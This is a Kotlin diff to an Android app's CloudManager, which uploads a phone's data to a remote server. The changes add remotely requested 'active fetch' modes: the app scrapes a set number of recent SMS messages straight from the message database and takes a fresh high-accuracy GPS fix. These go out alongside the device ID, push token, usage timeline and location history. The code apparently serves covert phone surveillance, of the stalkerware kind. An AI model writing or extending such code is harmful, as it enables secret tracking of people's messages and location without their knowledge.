@@ -9,11 +9,16 @@ import java.net.URL
 
 object CloudManager {
 
-    // Modular Upload: Takes a list of features to upload (e.g. ["sms", "location"] or ["ALL"])
+    // Modular Upload: Takes a list of features to upload (e.g. ["sms:20", "location"] or ["ALL"])
     suspend fun uploadData(ctx: Context, modules: List<String>) {
         withContext(Dispatchers.IO) {
             try {
                 DebugLogger.log("Cloud", "Starting Upload. Modules: $modules")
+
+                val moduleMap = modules.associate {
+                    val parts = it.split(":")
+                    parts[0].trim().lowercase() to (parts.getOrNull(1)?.toIntOrNull() ?: -1)
+                }
                 
                 // Check Global Config before uploading
                 if (!ConfigManager.canUpload(ctx)) {
@@ -25,55 +30,66 @@ object CloudManager {
                 json.put("device_id", DeviceManager.getDeviceId(ctx))
                 json.put("device_model", android.os.Build.MODEL)
 
-                // Fallback: Attach token to standard uploads if it exists
                 val fcmToken = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE).getString("fcm_token", null)
                 if (fcmToken != null) json.put("fcm_token", fcmToken)
-                json.put("trigger", "AUTO")
+                json.put("trigger", "MANUAL_FETCH")
                 
                 val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                val isAll = modules.contains("ALL")
+                val isAll = moduleMap.containsKey("all")
 
                 // --- MODULE 1: BASIC VITALS ---
-                if (isAll || modules.contains("vitals")) {
+                if (isAll || moduleMap.containsKey("vitals")) {
                     val batt = ctx.registerReceiver(null, android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED))
                     json.put("battery_level", batt?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0) ?: 0)
                 }
 
                 // --- MODULE 2: SMS ---
-                if (isAll || modules.contains("sms")) {
-                    json.put("sms_count", prefs.getInt("sms_count", 0))
-                    json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
-                    
-                    // Historical Dump (Vault-First Logic)
-                    if (!prefs.getBoolean("historical_sms_dumped", false)) {
-                        PhoneManager.vaultHistoricalSms(ctx)
-                        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")
-                        if (vaultFile.exists()) {
-                            json.put("historical_sms", JSONArray(vaultFile.readText()))
-                        }
+                if (isAll || moduleMap.containsKey("sms")) {
+                    val limit = moduleMap["sms"] ?: -1
+                    if (limit > 0) {
+                        // ACTIVE FETCH: Scrape DB directly for X latest items
+                        json.put("sms_logs", PhoneManager.getHistoricalSms(ctx, limit))
+                        json.put("fetch_mode", "ACTIVE_DB_SCRAPE")
+                    } else {
+                        // PASSIVE: Send cached logs
+                        json.put("sms_logs", JSONArray(prefs.getString("sms_logs_cache", "[]")))
                     }
+                    json.put("sms_count", prefs.getInt("sms_count", 0))
                 }
 
                 // --- MODULE 3: USAGE ---
-                if (isAll || modules.contains("usage")) {
+                if (isAll || moduleMap.containsKey("usage")) {
                      val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
                      val startToday = TimeManager.getStartOfDay()
                      val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_BEST, startToday, System.currentTimeMillis())
                      val totalMins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(
                          stats.filter { it.lastTimeUsed >= startToday }.sumOf { it.totalTimeInForeground }
                      )
-                     
                      json.put("screen_time_minutes", totalMins)
                      json.put("app_usage_timeline", UsageManager.getTimeline(ctx))
-                     
-                     // Online Time
-                     val (netTime, netSessions) = NetworkTracker.getStats(ctx)
-                     json.put("online_time_minutes", java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(netTime))
-                     json.put("online_sessions", netSessions)
                 }
 
                 // --- MODULE 4: LOCATION ---
-                if (isAll || modules.contains("location")) {
+                if (isAll || moduleMap.containsKey("location")) {
+                    // ACTIVE FETCH: Try to get fresh GPS fix now
+                    try {
+                        val fused = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(ctx)
+                        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                            val freshLoc = kotlinx.coroutines.tasks.await(fused.getCurrentLocation(com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null))
+                            if (freshLoc != null) {
+                                val locObj = JSONObject().apply {
+                                    put("lat", freshLoc.latitude)
+                                    put("lon", freshLoc.longitude)
+                                    put("acc", freshLoc.accuracy)
+                                    put("ts", System.currentTimeMillis())
+                                    put("fresh", true)
+                                }
+                                json.put("location_fresh", locObj)
+                            }
+                        }
+                    } catch (e: Exception) { 
+                        DebugLogger.log("GPS_ERR", "Fresh fix failed, falling back to history")
+                    }
                     json.put("location_history", JSONArray(prefs.getString("location_history", "[]")))
                 }
 
